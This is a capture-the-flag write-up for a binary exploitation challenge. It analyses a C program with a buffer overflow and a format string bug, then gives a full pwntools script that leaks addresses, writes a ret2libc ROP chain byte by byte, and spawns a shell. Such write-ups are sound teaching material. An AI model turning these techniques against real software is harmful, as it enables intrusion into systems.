This is a #fstrings  challenge with a fun little twist that relies on understanding of how strings in C are processed

### main
```c
int32_t main(int32_t argc, char** argv, char** envp)
    init()
    banner()
    return cave()
```
### cave
```c
int64_t cave()
    puts(str: "You found a `chirag`")
    puts(str: "upon rubbing it  jini appearred …")
    char input1[0x8]
    memset(&input1, 0, 8)
    char input2[0x8]
    memset(&input2, 0, 8)
    printf(format: "Enter your name >> ")
    read(fd: 0, buf: &input1, nbytes: 0x12)
    printf(format: "okay %s you can grant a small wi…", &input1)
    putchar(c: 0xa)
    printf(format: "Enter your wish >> ")
    read(fd: 0, buf: &input2, nbytes: 8)
    printf(format: &input2)
    putchar(c: 0xa)
    return puts(str: "Your wish is being fulfilled!")
```
- We can pretty quickly see that while `input1` is an `0x8` byte string, `0x12` bytes are read into it, giving us a buffer overflow
- We can also see `printf` being called on `input2` without variables being passed, meaning we can freely leak addresses on the stack
### stack
```c
entry -0x18 | char input2[0x8] {...}
entry -0x10 | char input1[0x8] {...}
entry  -0x8 | int64_t __saved_rbp
entry       | void* const __return_address
```
- As we can see, `input2` is seated above `input1` on the stack
- `input1` is seated above the saved `rbp` address, and `0x12` bytes are read into `input1`, meaning we can overwrite up to 2 bytes of saved `rip`, giving us a partial PIE overwrite
- Knowing how strings work in C, we also realize that we can combine `input2:input1:saved_rbp` to a string up to `0x18` bytes long, making the #fstring vulnerability feasible

- First, we can fuzz the `printf(&input2)` call to give us an address of each category, along with the offset of our input variable for the future `fmtstr_payload`
- Then, we can use the partial PIE overwrite to return to this function, allowing us to repeatedly perform the format string expolit
- We will create and write our `ret2libc` ROP chain, byte by byte (since the format string payload is exactly `0x18` bytes

### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./chall_patched"
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]


def fuzzer():
    context.log_level = "warning"
    for i in range(100):
        io = process(exe)
        io.sendlineafter(b"name >> ", b"")
        io.sendlineafter(b"wish >> ", f"%{i}$p")
        res = io.recvline().strip().decode()
        print(f"{i}: {res}")
        io.close()


# 1: 0x7fffd6b07960 # stk
# 3: 0x7f973c51ba91 # libc
# 6: 0xa70243625    # offset
# 9: 0x561a5a69b3d2 # bin

stkOffset = 0x28
libcOffset = 0x11BA91
binOffset = 0x13AC

context.log_level = "debug"
# io = gdb.debug(exe, "brva 0x138b\nc")
io = process(exe)

# leak stk, libc, and elf addresses
payload = flat({0: b"%9$p", 16: p8(0xCD)})  # jump to main's cave() call
io.sendafter(b"name >> ", payload)
io.sendafter(b"wish >> ", b"%1$p%3$p")
stkLeak = int(io.recv(14), 16)
libc.address = int(io.recv(14), 16) - libcOffset
elf.address = int(io.recv(14), 16) - binOffset
info("stkLeak: %#x", stkLeak)
info("libcBase: %#x", libc.address)
info("elfBase: %#x", elf.address)

# ret2libc rop chain
rop = ROP(libc)
rop.raw(rop.rdi.address)
rop.raw(next(libc.search(b"/bin/sh\x00")))
rop.raw(rop.ret.address)
rop.raw(libc.sym.system)
chain = rop.chain()

# write our rop chain onto the libc return address byte by byte
# this only works because we skip main's additional stack allocation
for i in range(0, len(chain)):
    fmstr = fmtstr_payload(offset=6, writes={stkLeak + stkOffset + i: chain[i : i + 1]})
    payload1 = flat({0: fmstr[8:], 16: p8(0xCD)})
    payload2 = fmstr[:8]
    io.sendafter(b"name >> ", payload1)
    io.sendafter(b"wish >> ", payload2)

io.sendafter(b"name >> ", b"exploit")
io.sendafter(b"wish >> ", b"pls")
io.interactive()
```



